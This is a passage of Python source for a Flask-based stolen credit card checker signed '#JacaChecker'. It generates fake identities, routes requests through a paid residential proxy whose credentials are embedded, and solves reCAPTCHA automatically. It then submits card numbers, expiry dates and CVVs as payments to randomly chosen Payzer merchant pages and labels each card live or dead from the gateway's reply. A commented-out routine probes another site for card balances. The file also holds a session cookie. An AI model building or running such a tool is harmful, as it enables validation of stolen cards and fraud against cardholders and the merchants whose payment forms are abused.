,"4384" ,"4382" ,"4395" ,"4397" ,"4387" ,"4399" ,"4398" ,"4396" ,"4390" ,"4402" ,"4400" ,"4408" ,"4409" ,"4403" ,"4411" ,"4418" ,"4417" ,"4419" ,"4413" ,"4425" ,"4424" ,"4430" ,"4422" ,"4427" ,"4437" ,"4444" ,"4445" ,"4450" ,"4440" ,"4442" ,"4452" ,"4453" ,"4456" ,"4454" ,"4458" ,"4459" ,"4460" ,"4462" ,"4463" ,"4467" ,"4468" ,"4466" ,"4469" ,"4457" ,"4476" ,"4478" ,"4479" ,"4483" ,"4488" ,"4489" ,"4491" ,"4494" ,"4496" ,"4497" ,"4490" ,"4505" ,"4507" ,"4509" ,"4514" ,"4506" ,"4502" ,"4516" ,"4522" ,"4519" ,"4524" ,"4525" ,"4532" ,"4527" ,"4528" ,"4543" ,"4537" ,"4544" ,"4545" ,"4546" ,"4552" ,"4534" ,"4558" ,"4561" ,"4563" ,"4551" ,"4560" ,"4566" ,"4574" ,"4567" ,"4570" ,"4582" ,"4584" ,"4581" ,"4583" ,"4590" ,"4595" ,"4592" ,"4597" ,"4591" ,"4593" ,"4602" ,"4608" ,"4605" ,"4613" ,"4606" ,"4616" ,"4620" ,"4617" ,"4624" ,"4626" ,"4628" ,"4627" ,"4634" ,"4640" ,"4630" ,"4639" ,"4644" ,"4652" ,"4660" ,"4654" ,"4659" ,"4664" ,"4658" ,"4665" ,"4668" ,"4663" ,"4672" ,"4673" ,"4675" ,"4669" ,"4677" ,"4678" ,"4683" ,"4680" ,"4686" ,"4687" ,"4691" ,"4688" ,"4692" ,"4695" ,"4698" ,"4696" ,"4709" ,"4707" ,"4700" ,"4705" ,"4711" ,"4708" ,"4713" ,"4712" ,"4726" ,"4721" ,"4724" ,"4733" ,"4739" ,"4737" ,"4742" ,"4745" ,"4740" ,"4746" ,"4744" ,"4747" ,"4748" ,"4753" ,"4756" ,"4760" ,"4758" ,"4764" ,"4774" ,"4770" ,"4776" ,"4769" ,"4777" ,"4773" ,"4779" ,"4785" ,"4789" ,"4783" ,"4784" ,"4793" ,"4792" ,"4790" ,"4796" ,"4802" ,"4808" ,"4815" ,"4807" ,"4812" ,"4811" ,"4827" ,"4825" ,"4834" ,"4831" ,"4830" ,"4836" ,"4843"]
def rkey():
    return random.choice(keys)
            # https://payzer.com/Payment/ExternalMake/businessId/7492     
            # https://payzer.com/Payment/ExternalMake/businessId/15273
            # https://payzer.com/Payment/ExternalMake/businessId/4908     
            # https://payzer.com/Payment/ExternalMake/businessId/5255       
            # https://payzer.com/Payment/ExternalMake/businessId/2118/embedded/y
            # https://payzer.com/index.php/Payment/ExternalMake/b/5693
            # https://payzer.com/index.php/Payment/ExternalMake/b/155
            # https://payzer.com/Payment/ExternalMake/businessId/402
            # https://payzer.com/Payment/ExternalMake/businessId/11720
            # https://payzer.com/index.php/Payment/ExternalMake/b/7368
            # https://payzer.com/index.php/Payment/ExternalMake/nt/PM-8ae08ce357d0a0f937c905942dd7a52a
            # https://payzer.com/Payment/ExternalMake/businessId/7775
            # https://payzer.com/Payment/ExternalMake/businessId/2062
            # https://payzer.com/Payment/ExternalMake/businessId/551
            # https://payzer.com/index.php/Payment/ExternalMake/b/2712
            # https://payzer.com/Payment/ExternalMake/businessId/10108
            # https://payzer.com/Payment/ExternalMake/businessId/7653
            # https://payzer.com/Payment/ExternalMake/businessId/2118/embedded/y
            #
            #
            #
            #
def definir_tipo_cartao(card):
    if card.startswith("4"):
        return "VISA"
    elif card.startswith(("51", "52", "53", "54", "55")):
        return "MASTER"
    elif card.startswith(("34", "37")):
        return "American Express"
    elif card.startswith("6"):
        return "Discover"
    else:
        return "Desconhecido"
    
# def retesteSaldo(card, month, year, cvv):
#         saldo(card, month, year, cvv)
        
# def saldo(card, month, year, cvv):
#         try:    
        
#             url = "https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US"
#             headers = {
#                     'Host': 'randomuser.me',
#                     'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
#                     'accept': 'application/json, text/plain, */*',
#                     'sec-ch-ua-mobile': '?0',
#                     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
#                     'sec-ch-ua-platform': '"Windows"',
#                     'origin': 'https://namso-gen.com',
#                     'sec-fetch-site': 'cross-site',
#                     'sec-fetch-mode': 'cors',
#                     'sec-fetch-dest': 'empty',
#                     'referer': 'https://namso-gen.com/',
#                     'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
#                     }

#             response = requests.get( url, headers=headers, verify=False)
#             email = pegarItem(response.text, '"email":"','"')
#             nome = pegarItem(response.text, '"first":"','"')
#             sobrenome = pegarItem(response.text, '"last":"','"')
#             street = pegarItem(response.text, '"name":"','"},"city"')
#             snumber = pegarItem(response.text, '"street":{"number":',',')
#             city = pegarItem(response.text, '"city":"','"')
#             state = pegarItem(response.text, '"state":"','"')
#             state = state[0:2].upper()
#             postcode = pegarItem(response.text, '"postcode":',',')
#             company = pegarItem(response.text, '"username":"','"')
#             tel = random.randint(1111,9999)
#             tel2 = random.randint(111,999)
#             tel3 = random.randint(111,999)
#             recap = Saldo()
            
#             if len(year) == 4:
#                 year = year[2:]
                
#             url = "https://www.eduwhere.com/secure/autopay_confirm.php"
#             payload = f"pigID=nada&ssl_invoice_number=nadaPnada&ssl_amount=11&invnbr={tel}{tel2}&user_message=+&cctype=VISA&ssl_card_number={card}&exp_date_month={month}&exp_date_year={year}&ssl_cvv2cvc2=232&ssl_first_name={nome}&ssl_last_name={sobrenome}&ssl_company=MR&ssl_avs_address={snumber}+{street}&ssl_address2=&ssl_city={city}&ssl_state={state}&ssl_avs_zip={postcode}&billcountry=United+States&ap_ponumber=&g-recaptcha-response={recap}"
#             headers = {
#                 'Host': 'www.eduwhere.com',
#                 'content-type': 'application/x-www-form-urlencoded',
#                 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
#                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
#                 }
#             response = requests.request("POST", url, headers=headers, data=payload, verify=False, allow_redirects=False)
#             if 'ssl_account_balance' in response.text:
#                 dolar = pegarItem(response.text, '&amp;ssl_account_balance=','&')
#                 return dolar
 
            
            
#         except requests.exceptions.ProxyError:
#             print(Fore.LIGHTWHITE_EX + f"RETESTANDO PROXY: {card}|{month}|{year}|{cvv}")
#             retesteSaldo(card, month, year, cvv)
#         except requests.exceptions.ConnectionError:
#             print(Fore.LIGHTWHITE_EX + f"RETESTANDO ConnectionError: {card}|{month}|{year}|{cvv}")
#             retesteSaldo(card, month, year, cvv)
#         except requests.exceptions.RequestException:
#             print(Fore.LIGHTWHITE_EX + f"RETESTANDO RequestException: {card}|{month}|{year}|{cvv}")
#             retesteSaldo(card, month, year, cvv)
    
    
def checker(card, month, year, cvv):
    try:
        #time.sleep(3)

        url = "https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US"
        headers = {
                'Host': 'randomuser.me',
                'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
                'accept': 'application/json, text/plain, */*',
                'sec-ch-ua-mobile': '?0',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
                'sec-ch-ua-platform': '"Windows"',
                'origin': 'https://namso-gen.com',
                'sec-fetch-site': 'cross-site',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://namso-gen.com/',
                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
                }

        response = requests.get( url, headers=headers, verify=False)
        email = pegarItem(response.text, '"email":"','"')
        nome = pegarItem(response.text, '"first":"','"')
        sobrenome = pegarItem(response.text, '"last":"','"')
        street = pegarItem(response.text, '"name":"','"},"city"')
        snumber = pegarItem(response.text, '"street":{"number":',',')
        city = pegarItem(response.text, '"city":"','"')
        state = pegarItem(response.text, '"state":"','"')
        state = state[0:2].upper()
        postcode = pegarItem(response.text, '"postcode":',',')
        company = pegarItem(response.text, '"username":"','"')
        tel = random.randint(1111,9999)
        tel2 = random.randint(111,999)
        tel3 = random.randint(111,999)
        #time.sleep(2)
        
        if response.status_code == 200:
            

            p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225'}
            start_time = time.time() 
            # ###
 

            key = rkey()

            url = f"https://www.payzer.com/Payment/ExternalMake/businessId/{key}"

            payload = {}
            headers = {
                'Host': 'www.payzer.com',
                'Cookie': 'PHPSESSID=jb64fndpm5n22f9je0kqleo5tsoa0nft; _gid=GA1.2.778086094.1713968828; _ga=GA1.1.1393613120.1713968828; _ga_4XLYQDPHZ2=GS1.1.1713968827.1.1.1713968985.60.0.0',
                'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'sec-fetch-site': 'none',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'priority': 'u=0, i'
                }

            response = requests.request("GET", url, headers=headers, data=payload, verify=False, allow_redirects=False, proxies=p, timeout=60)
            if 'location' in response.headers:
                loocation = response.headers.get('location')


            url = f"https://www.payzer.com{loocation}"

            payload = {}
            headers = {
                'Host': 'www.payzer.com',
                'Cookie': 'PHPSESSID=jb64fndpm5n22f9je0kqleo5tsoa0nft; _gid=GA1.2.778086094.1713968828; _ga=GA1.1.1393613120.1713968828; _ga_4XLYQDPHZ2=GS1.1.1713968827.1.1.1713968985.60.0.0; viewStyle=zend; outageMessageSeen=1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'sec-fetch-site': 'none',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'priority': 'u=0, i'
                }

            response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p, timeout=100)
            pm = pegarItem(response.text, 'name="nt" value="','"')
            
            
            recap = criarTask()
            url = f"https://www.payzer.com/Payment/ExternalMake/nt/{pm}"

            payload = {
                'nt':	pm,
                'businessId':	key,
                'businessCustomerId': '',	
                'faid':	'',
                'FirstName':	nome,
                'LastName':	sobrenome,
                'Email':	email,
                'mobilePhone':	f'({tel2}) {tel3}-{tel}',
                'Amount':	'$ 222.22',
                'Memo':	'',
                'PaymentMethod':	'card',
                'CardNumber':	card,
                'ExpirationMonth':	month,
                'ExpirationYear':	year,
                'Cvv':	cvv,
                'BillingZip':	postcode,
                'AchAccountHolderType':	'',
                'AchAccountType':	'',
                'InvoiceNumber': f'{tel3}{tel}',
                'AchNameOnAccount':	'',
                'achSameName':	'N',
                'RoutingNumber':	'',
                'AccountNumber':	'',
                'VerifyAccountNumber':	'',
                'g-recaptcha-response':	f'{recap}',
                'next':	'next'
            }
            headers = {
            'Host': 'www.payzer.com',
            'Cookie': 'PHPSESSID=jb64fndpm5n22f9je0kqleo5tsoa0nft; _gid=GA1.2.778086094.1713968828; viewStyle=zend; outageMessageSeen=1; _ga_4XLYQDPHZ2=GS1.1.1714002983.2.0.1714002983.60.0.0; _ga=GA1.2.1393613120.1713968828; _gat_gtag_UA_111485301_1=1',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'upgrade-insecure-requests': '1',
            'origin': 'https://www.payzer.com',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'referer': f'https://www.payzer.com/Payment/ExternalMake/nt/{pm}',
            'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=0, i'
            }

            response = requests.request("POST", url, headers=headers, data=payload, verify=False, allow_redirects=False, proxies=p, timeout=100)
            if 'location' in response.headers:
                loocation = response.headers.get('location')          
                             
                url = f"https://www.payzer.com{loocation}"

                payload = {}
                headers = {
                'Host': 'www.payzer.com',
                'Cookie': 'PHPSESSID=jb64fndpm5n22f9je0kqleo5tsoa0nft; _gid=GA1.2.778086094.1713968828; viewStyle=zend; outageMessageSeen=1; _ga_4XLYQDPHZ2=GS1.1.1714002983.2.0.1714002983.60.0.0; _ga=GA1.2.1393613120.1713968828; _gat_gtag_UA_111485301_1=1',
                'cache-control': 'max-age=0',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'referer': f'https://www.payzer.com/Payment/ExternalMake/nt/{pm}',
                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'priority': 'u=0, i'
                }

                response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p, timeout=60)
            
                url = f"https://www.payzer.com/Payment/ExternalConfirmPayment/nt/{pm}"

                payload = f"https://www.payzer.com/Payment/ExternalConfirmPayment/nt/{pm}"
                headers = {
                'Host': 'www.payzer.com',
                'Cookie': 'PHPSESSID=jb64fndpm5n22f9je0kqleo5tsoa0nft; _gid=GA1.2.778086094.1713968828; viewStyle=zend; outageMessageSeen=1; _gat_gtag_UA_111485301_1=1; _ga_4XLYQDPHZ2=GS1.1.1714002983.2.1.1714002999.44.0.0; _ga=GA1.1.1393613120.1713968828',
                'cache-control': 'max-age=0',
                'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'upgrade-insecure-requests': '1',
                'origin': 'https://www.payzer.com',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'referer': f'https://www.payzer.com/Payment/ExternalConfirmPayment/nt/{pm}',
                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'priority': 'u=0, i'
                }

                response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p, timeout=60)
                if 'getSelectedFinancingProduct' in response.text:
                    raise RequisicaoException()
                
                #time.sleep(1)
                elapsed_time = time.time() - start_time
                MSegundos = round(elapsed_time, 2)
                

                if 'Zip Code mismatch' in response.text:
                    # dolar = saldo(card, month, year, cvv)
                    bin = api_bin(card[:6])              
                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: AVS "                          
                    #open("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} NSF [{MSegundos}] #JacaChecker\n") 
                    print(Fore.GREEN + f"{x} #JacaChecker") 
                    return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}
                    
                elif 'Please retry' in response.text:
                    # dolar = saldo(card, month, year, cvv)
                    bin = api_bin(card[:6])              
                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry 19 "                    
                    #pen("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry 19 [{MSegundos}] #JacaChecker\n") 
                    print(Fore.GREEN + f"{x} #JacaChecker") 
                    return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}
                        
                elif 'error' in response.text:  
                    msg = pegarItem(response.text, 'reason: ','<')
                    bin = api_bin(card[:6])
                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: {msg} [{key}] MS"     
                    print(Fore.RED + f"{x} #JacaChecker")  
                    return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}  
                                            

                    
                else:
                    
                    print(Fore.RED + 'Gateway Timeout' + response.text)
                    return {"code": 2, "mensagem": f"Gateway Timeout #JacaChecker<br>"}
                    
                    


            
    except requests.exceptions.ProxyError:
        print(Fore.LIGHTWHITE_EX + f"RETESTANDO PROXY: {card}|{month}|{year}|{cvv}")
        #reteste(card, month, year, cvv)
        
    except requests.exceptions.ConnectionError:
        print(Fore.LIGHTWHITE_EX + f"RETESTANDO ConnectionError: {card}|{month}|{year}|{cvv}")
        #reteste(card, month, year, cvv)
    except requests.exceptions.RequestException:
        print(Fore.LIGHTWHITE_EX + f"RETESTANDO RequestException: {card}|{month}|{year}|{cvv}")
        #reteste(card, month, year, cvv)
    except RequisicaoException:
        print(Fore.LIGHTWHITE_EX + f"Bad Request ({key}): {card}|{month}|{year}|{cvv}")
        #reteste(card, month, year, cvv)
            


def processar_cartoes(card,mes,ano,cvv):
    try:
        if len(card) == 16 or len(card) == 15 and mes and ano and cvv:
            retorno = checker(card,mes,ano,cvv)
            return {"code": retorno["code"], "retorno": retorno["mensagem"]}
        else:
            return {"code": "", "retorno": "erro no formulario"}
    except:
        #retorno = reteste(card,mes,ano,cvv)
        return {"code": "", "retorno": "Exception !"}
    
    

            
            
@app.route('/', methods=['GET'])
def iniciarChk():
    return "@Engenieiro"


@app.route('/chk', methods=['GET'])
def chk():
    args = request.args
    print(args)
    card = args.get('card')
    mes = args.get('mes')
    ano = args.get('ano')
    cvv = args.get('cvv')
    return jsonify(processar_cartoes(card,mes,ano,cvv))



if __name__ == '__main__':
    app.run(host='localhost', port=5000, debug=True)
    
    
    
    

